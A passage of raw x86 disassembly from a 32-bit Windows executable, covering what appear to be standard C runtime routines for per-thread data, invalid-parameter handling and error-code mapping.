  406eb8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406ebb:	50                   	push   %eax
  406ebc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406ebf:	50                   	push   %eax
  406ec0:	e8 0f ff ff ff       	call   0x406dd4
  406ec5:	c9                   	leave
  406ec6:	c3                   	ret
  406ec7:	8b ff                	mov    %edi,%edi
  406ec9:	55                   	push   %ebp
  406eca:	8b ec                	mov    %esp,%ebp
  406ecc:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406ed0:	74 12                	je     0x406ee4
  406ed2:	ff 75 08             	push   0x8(%ebp)
  406ed5:	e8 0e 00 00 00       	call   0x406ee8
  406eda:	ff 75 08             	push   0x8(%ebp)
  406edd:	e8 e5 0b 00 00       	call   0x407ac7
  406ee2:	59                   	pop    %ecx
  406ee3:	59                   	pop    %ecx
  406ee4:	5d                   	pop    %ebp
  406ee5:	c2 04 00             	ret    $0x4
  406ee8:	8b ff                	mov    %edi,%edi
  406eea:	55                   	push   %ebp
  406eeb:	8b ec                	mov    %esp,%ebp
  406eed:	8b 45 08             	mov    0x8(%ebp),%eax
  406ef0:	83 ec 10             	sub    $0x10,%esp
  406ef3:	8b 08                	mov    (%eax),%ecx
  406ef5:	81 f9 c8 fd 40 00    	cmp    $0x40fdc8,%ecx
  406efb:	74 0a                	je     0x406f07
  406efd:	51                   	push   %ecx
  406efe:	e8 c4 0b 00 00       	call   0x407ac7
  406f03:	8b 45 08             	mov    0x8(%ebp),%eax
  406f06:	59                   	pop    %ecx
  406f07:	ff 70 3c             	push   0x3c(%eax)
  406f0a:	e8 b8 0b 00 00       	call   0x407ac7
  406f0f:	8b 45 08             	mov    0x8(%ebp),%eax
  406f12:	ff 70 30             	push   0x30(%eax)
  406f15:	e8 ad 0b 00 00       	call   0x407ac7
  406f1a:	8b 45 08             	mov    0x8(%ebp),%eax
  406f1d:	ff 70 34             	push   0x34(%eax)
  406f20:	e8 a2 0b 00 00       	call   0x407ac7
  406f25:	8b 45 08             	mov    0x8(%ebp),%eax
  406f28:	ff 70 38             	push   0x38(%eax)
  406f2b:	e8 97 0b 00 00       	call   0x407ac7
  406f30:	8b 45 08             	mov    0x8(%ebp),%eax
  406f33:	ff 70 28             	push   0x28(%eax)
  406f36:	e8 8c 0b 00 00       	call   0x407ac7
  406f3b:	8b 45 08             	mov    0x8(%ebp),%eax
  406f3e:	ff 70 2c             	push   0x2c(%eax)
  406f41:	e8 81 0b 00 00       	call   0x407ac7
  406f46:	8b 45 08             	mov    0x8(%ebp),%eax
  406f49:	ff 70 40             	push   0x40(%eax)
  406f4c:	e8 76 0b 00 00       	call   0x407ac7
  406f51:	8b 45 08             	mov    0x8(%ebp),%eax
  406f54:	ff 70 44             	push   0x44(%eax)
  406f57:	e8 6b 0b 00 00       	call   0x407ac7
  406f5c:	8b 45 08             	mov    0x8(%ebp),%eax
  406f5f:	ff b0 60 03 00 00    	push   0x360(%eax)
  406f65:	e8 5d 0b 00 00       	call   0x407ac7
  406f6a:	83 c4 24             	add    $0x24,%esp
  406f6d:	8d 45 08             	lea    0x8(%ebp),%eax
  406f70:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406f73:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406f76:	6a 05                	push   $0x5
  406f78:	58                   	pop    %eax
  406f79:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406f7c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406f7f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406f82:	50                   	push   %eax
  406f83:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406f86:	50                   	push   %eax
  406f87:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406f8a:	50                   	push   %eax
  406f8b:	e8 84 fd ff ff       	call   0x406d14
  406f90:	6a 04                	push   $0x4
  406f92:	8d 45 08             	lea    0x8(%ebp),%eax
  406f95:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406f98:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406f9b:	58                   	pop    %eax
  406f9c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406f9f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406fa2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406fa5:	50                   	push   %eax
  406fa6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406fa9:	50                   	push   %eax
  406faa:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406fad:	50                   	push   %eax
  406fae:	e8 cc fd ff ff       	call   0x406d7f
  406fb3:	c9                   	leave
  406fb4:	c3                   	ret
  406fb5:	8b ff                	mov    %edi,%edi
  406fb7:	55                   	push   %ebp
  406fb8:	8b ec                	mov    %esp,%ebp
  406fba:	56                   	push   %esi
  406fbb:	8b 75 08             	mov    0x8(%ebp),%esi
  406fbe:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  406fc2:	74 28                	je     0x406fec
  406fc4:	ff 76 4c             	push   0x4c(%esi)
  406fc7:	e8 24 2a 00 00       	call   0x4099f0
  406fcc:	8b 46 4c             	mov    0x4c(%esi),%eax
  406fcf:	59                   	pop    %ecx
  406fd0:	3b 05 38 6f 41 00    	cmp    0x416f38,%eax
  406fd6:	74 14                	je     0x406fec
  406fd8:	3d 60 60 41 00       	cmp    $0x416060,%eax
  406fdd:	74 0d                	je     0x406fec
  406fdf:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  406fe3:	75 07                	jne    0x406fec
  406fe5:	50                   	push   %eax
  406fe6:	e8 3a 28 00 00       	call   0x409825
  406feb:	59                   	pop    %ecx
  406fec:	8b 45 0c             	mov    0xc(%ebp),%eax
  406fef:	89 46 4c             	mov    %eax,0x4c(%esi)
  406ff2:	5e                   	pop    %esi
  406ff3:	85 c0                	test   %eax,%eax
  406ff5:	74 07                	je     0x406ffe
  406ff7:	50                   	push   %eax
  406ff8:	e8 ab 27 00 00       	call   0x4097a8
  406ffd:	59                   	pop    %ecx
  406ffe:	5d                   	pop    %ebp
  406fff:	c3                   	ret
  407000:	8b ff                	mov    %edi,%edi
  407002:	53                   	push   %ebx
  407003:	56                   	push   %esi
  407004:	57                   	push   %edi
  407005:	ff 15 70 f0 40 00    	call   *0x40f070
  40700b:	8b f0                	mov    %eax,%esi
  40700d:	a1 50 60 41 00       	mov    0x416050,%eax
  407012:	83 f8 ff             	cmp    $0xffffffff,%eax
  407015:	74 1c                	je     0x407033
  407017:	50                   	push   %eax
  407018:	e8 26 07 00 00       	call   0x407743
  40701d:	8b f8                	mov    %eax,%edi
  40701f:	85 ff                	test   %edi,%edi
  407021:	74 0b                	je     0x40702e
  407023:	83 ff ff             	cmp    $0xffffffff,%edi
  407026:	75 78                	jne    0x4070a0
  407028:	33 db                	xor    %ebx,%ebx
  40702a:	8b fb                	mov    %ebx,%edi
  40702c:	eb 74                	jmp    0x4070a2
  40702e:	a1 50 60 41 00       	mov    0x416050,%eax
  407033:	6a ff                	push   $0xffffffff
  407035:	50                   	push   %eax
  407036:	e8 47 07 00 00       	call   0x407782
  40703b:	85 c0                	test   %eax,%eax
  40703d:	74 e9                	je     0x407028
  40703f:	68 64 03 00 00       	push   $0x364
  407044:	6a 01                	push   $0x1
  407046:	e8 1f 0a 00 00       	call   0x407a6a
  40704b:	8b f8                	mov    %eax,%edi
  40704d:	59                   	pop    %ecx
  40704e:	59                   	pop    %ecx
  40704f:	85 ff                	test   %edi,%edi
  407051:	75 17                	jne    0x40706a
  407053:	33 db                	xor    %ebx,%ebx
  407055:	53                   	push   %ebx
  407056:	ff 35 50 60 41 00    	push   0x416050
  40705c:	e8 21 07 00 00       	call   0x407782
  407061:	53                   	push   %ebx
  407062:	e8 60 0a 00 00       	call   0x407ac7
  407067:	59                   	pop    %ecx
  407068:	eb c0                	jmp    0x40702a
  40706a:	57                   	push   %edi
  40706b:	ff 35 50 60 41 00    	push   0x416050
  407071:	e8 0c 07 00 00       	call   0x407782
  407076:	85 c0                	test   %eax,%eax
  407078:	75 11                	jne    0x40708b
  40707a:	33 db                	xor    %ebx,%ebx
  40707c:	53                   	push   %ebx
  40707d:	ff 35 50 60 41 00    	push   0x416050
  407083:	e8 fa 06 00 00       	call   0x407782
  407088:	57                   	push   %edi
  407089:	eb d7                	jmp    0x407062
  40708b:	68 38 6f 41 00       	push   $0x416f38
  407090:	57                   	push   %edi
  407091:	e8 98 fd ff ff       	call   0x406e2e
  407096:	6a 00                	push   $0x0
  407098:	e8 2a 0a 00 00       	call   0x407ac7
  40709d:	83 c4 0c             	add    $0xc,%esp
  4070a0:	8b df                	mov    %edi,%ebx
  4070a2:	56                   	push   %esi
  4070a3:	ff 15 7c f1 40 00    	call   *0x40f17c
  4070a9:	f7 df                	neg    %edi
  4070ab:	1b ff                	sbb    %edi,%edi
  4070ad:	23 fb                	and    %ebx,%edi
  4070af:	74 06                	je     0x4070b7
  4070b1:	8b c7                	mov    %edi,%eax
  4070b3:	5f                   	pop    %edi
  4070b4:	5e                   	pop    %esi
  4070b5:	5b                   	pop    %ebx
  4070b6:	c3                   	ret
  4070b7:	e8 01 fb ff ff       	call   0x406bbd
  4070bc:	cc                   	int3
  4070bd:	a1 50 60 41 00       	mov    0x416050,%eax
  4070c2:	56                   	push   %esi
  4070c3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4070c6:	74 18                	je     0x4070e0
  4070c8:	50                   	push   %eax
  4070c9:	e8 75 06 00 00       	call   0x407743
  4070ce:	8b f0                	mov    %eax,%esi
  4070d0:	85 f6                	test   %esi,%esi
  4070d2:	74 07                	je     0x4070db
  4070d4:	83 fe ff             	cmp    $0xffffffff,%esi
  4070d7:	74 78                	je     0x407151
  4070d9:	eb 6e                	jmp    0x407149
  4070db:	a1 50 60 41 00       	mov    0x416050,%eax
  4070e0:	6a ff                	push   $0xffffffff
  4070e2:	50                   	push   %eax
  4070e3:	e8 9a 06 00 00       	call   0x407782
  4070e8:	85 c0                	test   %eax,%eax
  4070ea:	74 65                	je     0x407151
  4070ec:	68 64 03 00 00       	push   $0x364
  4070f1:	6a 01                	push   $0x1
  4070f3:	e8 72 09 00 00       	call   0x407a6a
  4070f8:	8b f0                	mov    %eax,%esi
  4070fa:	59                   	pop    %ecx
  4070fb:	59                   	pop    %ecx
  4070fc:	85 f6                	test   %esi,%esi
  4070fe:	75 15                	jne    0x407115
  407100:	50                   	push   %eax
  407101:	ff 35 50 60 41 00    	push   0x416050
  407107:	e8 76 06 00 00       	call   0x407782
  40710c:	56                   	push   %esi
  40710d:	e8 b5 09 00 00       	call   0x407ac7
  407112:	59                   	pop    %ecx
  407113:	eb 3c                	jmp    0x407151
  407115:	56                   	push   %esi
  407116:	ff 35 50 60 41 00    	push   0x416050
  40711c:	e8 61 06 00 00       	call   0x407782
  407121:	85 c0                	test   %eax,%eax
  407123:	75 0f                	jne    0x407134
  407125:	50                   	push   %eax
  407126:	ff 35 50 60 41 00    	push   0x416050
  40712c:	e8 51 06 00 00       	call   0x407782
  407131:	56                   	push   %esi
  407132:	eb d9                	jmp    0x40710d
  407134:	68 38 6f 41 00       	push   $0x416f38
  407139:	56                   	push   %esi
  40713a:	e8 ef fc ff ff       	call   0x406e2e
  40713f:	6a 00                	push   $0x0
  407141:	e8 81 09 00 00       	call   0x407ac7
  407146:	83 c4 0c             	add    $0xc,%esp
  407149:	85 f6                	test   %esi,%esi
  40714b:	74 04                	je     0x407151
  40714d:	8b c6                	mov    %esi,%eax
  40714f:	5e                   	pop    %esi
  407150:	c3                   	ret
  407151:	e8 67 fa ff ff       	call   0x406bbd
  407156:	cc                   	int3
  407157:	8b ff                	mov    %edi,%edi
  407159:	53                   	push   %ebx
  40715a:	56                   	push   %esi
  40715b:	57                   	push   %edi
  40715c:	ff 15 70 f0 40 00    	call   *0x40f070
  407162:	8b f0                	mov    %eax,%esi
  407164:	a1 50 60 41 00       	mov    0x416050,%eax
  407169:	83 f8 ff             	cmp    $0xffffffff,%eax
  40716c:	74 1c                	je     0x40718a
  40716e:	50                   	push   %eax
  40716f:	e8 cf 05 00 00       	call   0x407743
  407174:	8b f8                	mov    %eax,%edi
  407176:	85 ff                	test   %edi,%edi
  407178:	74 0b                	je     0x407185
  40717a:	83 ff ff             	cmp    $0xffffffff,%edi
  40717d:	75 78                	jne    0x4071f7
  40717f:	33 db                	xor    %ebx,%ebx
  407181:	8b fb                	mov    %ebx,%edi
  407183:	eb 74                	jmp    0x4071f9
  407185:	a1 50 60 41 00       	mov    0x416050,%eax
  40718a:	6a ff                	push   $0xffffffff
  40718c:	50                   	push   %eax
  40718d:	e8 f0 05 00 00       	call   0x407782
  407192:	85 c0                	test   %eax,%eax
  407194:	74 e9                	je     0x40717f
  407196:	68 64 03 00 00       	push   $0x364
  40719b:	6a 01                	push   $0x1
  40719d:	e8 c8 08 00 00       	call   0x407a6a
  4071a2:	8b f8                	mov    %eax,%edi
  4071a4:	59                   	pop    %ecx
  4071a5:	59                   	pop    %ecx
  4071a6:	85 ff                	test   %edi,%edi
  4071a8:	75 17                	jne    0x4071c1
  4071aa:	33 db                	xor    %ebx,%ebx
  4071ac:	53                   	push   %ebx
  4071ad:	ff 35 50 60 41 00    	push   0x416050
  4071b3:	e8 ca 05 00 00       	call   0x407782
  4071b8:	53                   	push   %ebx
  4071b9:	e8 09 09 00 00       	call   0x407ac7
  4071be:	59                   	pop    %ecx
  4071bf:	eb c0                	jmp    0x407181
  4071c1:	57                   	push   %edi
  4071c2:	ff 35 50 60 41 00    	push   0x416050
  4071c8:	e8 b5 05 00 00       	call   0x407782
  4071cd:	85 c0                	test   %eax,%eax
  4071cf:	75 11                	jne    0x4071e2
  4071d1:	33 db                	xor    %ebx,%ebx
  4071d3:	53                   	push   %ebx
  4071d4:	ff 35 50 60 41 00    	push   0x416050
  4071da:	e8 a3 05 00 00       	call   0x407782
  4071df:	57                   	push   %edi
  4071e0:	eb d7                	jmp    0x4071b9
  4071e2:	68 38 6f 41 00       	push   $0x416f38
  4071e7:	57                   	push   %edi
  4071e8:	e8 41 fc ff ff       	call   0x406e2e
  4071ed:	6a 00                	push   $0x0
  4071ef:	e8 d3 08 00 00       	call   0x407ac7
  4071f4:	83 c4 0c             	add    $0xc,%esp
  4071f7:	8b df                	mov    %edi,%ebx
  4071f9:	56                   	push   %esi
  4071fa:	ff 15 7c f1 40 00    	call   *0x40f17c
  407200:	f7 df                	neg    %edi
  407202:	1b ff                	sbb    %edi,%edi
  407204:	23 fb                	and    %ebx,%edi
  407206:	8b c7                	mov    %edi,%eax
  407208:	5f                   	pop    %edi
  407209:	5e                   	pop    %esi
  40720a:	5b                   	pop    %ebx
  40720b:	c3                   	ret
  40720c:	68 c7 6e 40 00       	push   $0x406ec7
  407211:	e8 af 04 00 00       	call   0x4076c5
  407216:	a3 50 60 41 00       	mov    %eax,0x416050
  40721b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40721e:	75 03                	jne    0x407223
  407220:	32 c0                	xor    %al,%al
  407222:	c3                   	ret
  407223:	e8 2f ff ff ff       	call   0x407157
  407228:	85 c0                	test   %eax,%eax
  40722a:	75 09                	jne    0x407235
  40722c:	50                   	push   %eax
  40722d:	e8 06 00 00 00       	call   0x407238
  407232:	59                   	pop    %ecx
  407233:	eb eb                	jmp    0x407220
  407235:	b0 01                	mov    $0x1,%al
  407237:	c3                   	ret
  407238:	a1 50 60 41 00       	mov    0x416050,%eax
  40723d:	83 f8 ff             	cmp    $0xffffffff,%eax
  407240:	74 0d                	je     0x40724f
  407242:	50                   	push   %eax
  407243:	e8 bc 04 00 00       	call   0x407704
  407248:	83 0d 50 60 41 00 ff 	orl    $0xffffffff,0x416050
  40724f:	b0 01                	mov    $0x1,%al
  407251:	c3                   	ret
  407252:	8b ff                	mov    %edi,%edi
  407254:	55                   	push   %ebp
  407255:	8b ec                	mov    %esp,%ebp
  407257:	81 ec 28 03 00 00    	sub    $0x328,%esp
  40725d:	a1 04 60 41 00       	mov    0x416004,%eax
  407262:	33 c5                	xor    %ebp,%eax
  407264:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407267:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  40726b:	57                   	push   %edi
  40726c:	74 09                	je     0x407277
  40726e:	ff 75 08             	push   0x8(%ebp)
  407271:	e8 11 cf ff ff       	call   0x404187
  407276:	59                   	pop    %ecx
  407277:	6a 50                	push   $0x50
  407279:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  40727f:	6a 00                	push   $0x0
  407281:	50                   	push   %eax
  407282:	e8 09 d8 ff ff       	call   0x404a90
  407287:	68 cc 02 00 00       	push   $0x2cc
  40728c:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  407292:	6a 00                	push   $0x0
  407294:	50                   	push   %eax
  407295:	e8 f6 d7 ff ff       	call   0x404a90
  40729a:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4072a0:	83 c4 18             	add    $0x18,%esp
  4072a3:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  4072a9:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  4072af:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4072b5:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  4072bb:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
  4072c1:	89 95 d8 fd ff ff    	mov    %edx,-0x228(%ebp)
  4072c7:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  4072cd:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
  4072d3:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
  4072d9:	66 8c 95 f8 fd ff ff 	data16 mov %ss,-0x208(%ebp)
  4072e0:	66 8c 8d ec fd ff ff 	data16 mov %cs,-0x214(%ebp)
  4072e7:	66 8c 9d c8 fd ff ff 	data16 mov %ds,-0x238(%ebp)
  4072ee:	66 8c 85 c4 fd ff ff 	data16 mov %es,-0x23c(%ebp)
  4072f5:	66 8c a5 c0 fd ff ff 	data16 mov %fs,-0x240(%ebp)
  4072fc:	66 8c ad bc fd ff ff 	data16 mov %gs,-0x244(%ebp)
  407303:	9c                   	pushf
  407304:	8f 85 f0 fd ff ff    	pop    -0x210(%ebp)
  40730a:	8b 45 04             	mov    0x4(%ebp),%eax
  40730d:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  407313:	8d 45 04             	lea    0x4(%ebp),%eax
  407316:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  40731c:	c7 85 30 fd ff ff 01 	movl   $0x10001,-0x2d0(%ebp)
  407323:	00 01 00 
  407326:	8b 40 fc             	mov    -0x4(%eax),%eax
  407329:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  40732f:	8b 45 0c             	mov    0xc(%ebp),%eax
  407332:	89 85 e0 fc ff ff    	mov    %eax,-0x320(%ebp)
  407338:	8b 45 10             	mov    0x10(%ebp),%eax
  40733b:	89 85 e4 fc ff ff    	mov    %eax,-0x31c(%ebp)
  407341:	8b 45 04             	mov    0x4(%ebp),%eax
  407344:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  40734a:	ff 15 6c f1 40 00    	call   *0x40f16c
  407350:	6a 00                	push   $0x0
  407352:	8b f8                	mov    %eax,%edi
  407354:	ff 15 54 f1 40 00    	call   *0x40f154
  40735a:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  407360:	50                   	push   %eax
  407361:	ff 15 50 f1 40 00    	call   *0x40f150
  407367:	85 c0                	test   %eax,%eax
  407369:	75 13                	jne    0x40737e
  40736b:	85 ff                	test   %edi,%edi
  40736d:	75 0f                	jne    0x40737e
  40736f:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  407373:	74 09                	je     0x40737e
  407375:	ff 75 08             	push   0x8(%ebp)
  407378:	e8 0a ce ff ff       	call   0x404187
  40737d:	59                   	pop    %ecx
  40737e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407381:	33 cd                	xor    %ebp,%ecx
  407383:	5f                   	pop    %edi
  407384:	e8 bc c3 ff ff       	call   0x403745
  407389:	c9                   	leave
  40738a:	c3                   	ret
  40738b:	8b ff                	mov    %edi,%edi
  40738d:	55                   	push   %ebp
  40738e:	8b ec                	mov    %esp,%ebp
  407390:	8b 45 08             	mov    0x8(%ebp),%eax
  407393:	a3 5c 6e 41 00       	mov    %eax,0x416e5c
  407398:	5d                   	pop    %ebp
  407399:	c3                   	ret
  40739a:	8b ff                	mov    %edi,%edi
  40739c:	55                   	push   %ebp
  40739d:	8b ec                	mov    %esp,%ebp
  40739f:	56                   	push   %esi
  4073a0:	e8 b2 fd ff ff       	call   0x407157
  4073a5:	85 c0                	test   %eax,%eax
  4073a7:	74 29                	je     0x4073d2
  4073a9:	8b b0 5c 03 00 00    	mov    0x35c(%eax),%esi
  4073af:	85 f6                	test   %esi,%esi
  4073b1:	74 1f                	je     0x4073d2
  4073b3:	ff 75 18             	push   0x18(%ebp)
  4073b6:	ff 75 14             	push   0x14(%ebp)
  4073b9:	ff 75 10             	push   0x10(%ebp)
  4073bc:	ff 75 0c             	push   0xc(%ebp)
  4073bf:	ff 75 08             	push   0x8(%ebp)
  4073c2:	8b ce                	mov    %esi,%ecx
  4073c4:	ff 15 24 f2 40 00    	call   *0x40f224
  4073ca:	ff d6                	call   *%esi
  4073cc:	83 c4 14             	add    $0x14,%esp
  4073cf:	5e                   	pop    %esi
  4073d0:	5d                   	pop    %ebp
  4073d1:	c3                   	ret
  4073d2:	ff 75 18             	push   0x18(%ebp)
  4073d5:	8b 35 04 60 41 00    	mov    0x416004,%esi
  4073db:	8b ce                	mov    %esi,%ecx
  4073dd:	ff 75 14             	push   0x14(%ebp)
  4073e0:	33 35 5c 6e 41 00    	xor    0x416e5c,%esi
  4073e6:	83 e1 1f             	and    $0x1f,%ecx
  4073e9:	ff 75 10             	push   0x10(%ebp)
  4073ec:	d3 ce                	ror    %cl,%esi
  4073ee:	ff 75 0c             	push   0xc(%ebp)
  4073f1:	ff 75 08             	push   0x8(%ebp)
  4073f4:	85 f6                	test   %esi,%esi
  4073f6:	75 ca                	jne    0x4073c2
  4073f8:	e8 11 00 00 00       	call   0x40740e
  4073fd:	cc                   	int3
  4073fe:	33 c0                	xor    %eax,%eax
  407400:	50                   	push   %eax
  407401:	50                   	push   %eax
  407402:	50                   	push   %eax
  407403:	50                   	push   %eax
  407404:	50                   	push   %eax
  407405:	e8 90 ff ff ff       	call   0x40739a
  40740a:	83 c4 14             	add    $0x14,%esp
  40740d:	c3                   	ret
  40740e:	6a 17                	push   $0x17
  407410:	ff 15 58 f1 40 00    	call   *0x40f158
  407416:	85 c0                	test   %eax,%eax
  407418:	74 05                	je     0x40741f
  40741a:	6a 05                	push   $0x5
  40741c:	59                   	pop    %ecx
  40741d:	cd 29                	int    $0x29
  40741f:	56                   	push   %esi
  407420:	6a 01                	push   $0x1
  407422:	be 17 04 00 c0       	mov    $0xc0000417,%esi
  407427:	56                   	push   %esi
  407428:	6a 02                	push   $0x2
  40742a:	e8 23 fe ff ff       	call   0x407252
  40742f:	83 c4 0c             	add    $0xc,%esp
  407432:	56                   	push   %esi
  407433:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  407439:	50                   	push   %eax
  40743a:	ff 15 ec f0 40 00    	call   *0x40f0ec
  407440:	5e                   	pop    %esi
  407441:	c3                   	ret
  407442:	8b ff                	mov    %edi,%edi
  407444:	55                   	push   %ebp
  407445:	8b ec                	mov    %esp,%ebp
  407447:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40744a:	33 c0                	xor    %eax,%eax
  40744c:	3b 0c c5 10 ff 40 00 	cmp    0x40ff10(,%eax,8),%ecx
  407453:	74 27                	je     0x40747c
  407455:	40                   	inc    %eax
  407456:	83 f8 2d             	cmp    $0x2d,%eax
  407459:	72 f1                	jb     0x40744c
  40745b:	8d 41 ed             	lea    -0x13(%ecx),%eax
  40745e:	83 f8 11             	cmp    $0x11,%eax
  407461:	77 05                	ja     0x407468
  407463:	6a 0d                	push   $0xd
  407465:	58                   	pop    %eax
  407466:	5d                   	pop    %ebp
  407467:	c3                   	ret
  407468:	8d 81 44 ff ff ff    	lea    -0xbc(%ecx),%eax
  40746e:	6a 0e                	push   $0xe
  407470:	59                   	pop    %ecx
  407471:	3b c8                	cmp    %eax,%ecx
  407473:	1b c0                	sbb    %eax,%eax
  407475:	23 c1                	and    %ecx,%eax
  407477:	83 c0 08             	add    $0x8,%eax
  40747a:	5d                   	pop    %ebp
  40747b:	c3                   	ret
  40747c:	8b 04 c5 14 ff 40 00 	mov    0x40ff14(,%eax,8),%eax
  407483:	5d                   	pop    %ebp
  407484:	c3                   	ret
  407485:	8b ff                	mov    %edi,%edi
  407487:	55                   	push   %ebp
  407488:	8b ec                	mov    %esp,%ebp
  40748a:	56                   	push   %esi
  40748b:	e8 18 00 00 00       	call   0x4074a8
  407490:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407493:	51                   	push   %ecx
  407494:	89 08                	mov    %ecx,(%eax)
  407496:	e8 a7 ff ff ff       	call   0x407442
  40749b:	59                   	pop    %ecx
  40749c:	8b f0                	mov    %eax,%esi
  40749e:	e8 18 00 00 00       	call   0x4074bb
  4074a3:	89 30                	mov    %esi,(%eax)
  4074a5:	5e                   	pop    %esi
  4074a6:	5d                   	pop    %ebp
  4074a7:	c3                   	ret
  4074a8:	e8 aa fc ff ff       	call   0x407157
  4074ad:	85 c0                	test   %eax,%eax
  4074af:	75 06                	jne    0x4074b7
  4074b1:	b8 58 60 41 00       	mov    $0x416058,%eax
  4074b6:	c3                   	ret
  4074b7:	83 c0 14             	add    $0x14,%eax
  4074ba:	c3                   	ret
  4074bb:	e8 97 fc ff ff       	call   0x407157
  4074c0:	85 c0                	test   %eax,%eax
  4074c2:	75 06                	jne    0x4074ca
  4074c4:	b8 54 60 41 00       	mov    $0x416054,%eax
  4074c9:	c3                   	ret
  4074ca:	83 c0 10             	add    $0x10,%eax
  4074cd:	c3                   	ret
  4074ce:	68 f4 04 41 00       	push   $0x4104f4
  4074d3:	68 f0 04 41 00       	push   $0x4104f0
  4074d8:	68 f4 04 41 00       	push   $0x4104f4
  4074dd:	6a 00                	push   $0x0
  4074df:	e8 ff 00 00 00       	call   0x4075e3
  4074e4:	83 c4 10             	add    $0x10,%esp
  4074e7:	c3                   	ret
  4074e8:	68 34 05 41 00       	push   $0x410534
  4074ed:	68 2c 05 41 00       	push   $0x41052c
  4074f2:	68 34 05 41 00       	push   $0x410534
  4074f7:	6a 14                	push   $0x14
  4074f9:	e8 e5 00 00 00       	call   0x4075e3
  4074fe:	83 c4 10             	add    $0x10,%esp
  407501:	c3                   	ret
  407502:	68 4c 05 41 00       	push   $0x41054c
  407507:	68 44 05 41 00       	push   $0x410544
  40750c:	68 4c 05 41 00       	push   $0x41054c
  407511:	6a 16                	push   $0x16
  407513:	e8 cb 00 00 00       	call   0x4075e3
  407518:	83 c4 10             	add    $0x10,%esp
  40751b:	c3                   	ret
  40751c:	8b ff                	mov    %edi,%edi
  40751e:	55                   	push   %ebp
  40751f:	8b ec                	mov    %esp,%ebp
  407521:	51                   	push   %ecx
  407522:	53                   	push   %ebx
  407523:	56                   	push   %esi
  407524:	57                   	push   %edi
  407525:	8b 7d 08             	mov    0x8(%ebp),%edi
  407528:	e9 a2 00 00 00       	jmp    0x4075cf
  40752d:	8b 1f                	mov    (%edi),%ebx
  40752f:	8d 04 9d 60 6e 41 00 	lea    0x416e60(,%ebx,4),%eax
  407536:	8b 30                	mov    (%eax),%esi
  407538:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40753b:	90                   	nop
  40753c:	85 f6                	test   %esi,%esi
  40753e:	74 0b                	je     0x40754b
  407540:	83 fe ff             	cmp    $0xffffffff,%esi
  407543:	0f 84 83 00 00 00    	je     0x4075cc
  407549:	eb 7d                	jmp    0x4075c8
  40754b:	8b 1c 9d 78 00 41 00 	mov    0x410078(,%ebx,4),%ebx
  407552:	68 00 08 00 00       	push   $0x800
  407557:	6a 00                	push   $0x0
  407559:	53                   	push   %ebx
  40755a:	ff 15 a0 f1 40 00    	call   *0x40f1a0
  407560:	8b f0                	mov    %eax,%esi
  407562:	85 f6                	test   %esi,%esi
  407564:	75 50                	jne    0x4075b6
  407566:	ff 15 70 f0 40 00    	call   *0x40f070
  40756c:	83 f8 57             	cmp    $0x57,%eax
  40756f:	75 35                	jne    0x4075a6
  407571:	6a 07                	push   $0x7
  407573:	68 44 fd 40 00       	push   $0x40fd44
  407578:	53                   	push   %ebx
  407579:	e8 0a f7 ff ff       	call   0x406c88
  40757e:	83 c4 0c             	add    $0xc,%esp
  407581:	85 c0                	test   %eax,%eax
  407583:	74 21                	je     0x4075a6
  407585:	6a 07                	push   $0x7
  407587:	68 e0 04 41 00       	push   $0x4104e0
  40758c:	53                   	push   %ebx
  40758d:	e8 f6 f6 ff ff       	call   0x406c88
  407592:	83 c4 0c             	add    $0xc,%esp
  407595:	85 c0                	test   %eax,%eax
  407597:	74 0d                	je     0x4075a6
  407599:	56                   	push   %esi
  40759a:	56                   	push   %esi
  40759b:	53                   	push   %ebx
  40759c:	ff 15 a0 f1 40 00    	call   *0x40f1a0
  4075a2:	8b f0                	mov    %eax,%esi
  4075a4:	eb 02                	jmp    0x4075a8
  4075a6:	33 f6                	xor    %esi,%esi
  4075a8:	85 f6                	test   %esi,%esi
  4075aa:	75 0a                	jne    0x4075b6
  4075ac:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4075af:	83 c8 ff             	or     $0xffffffff,%eax
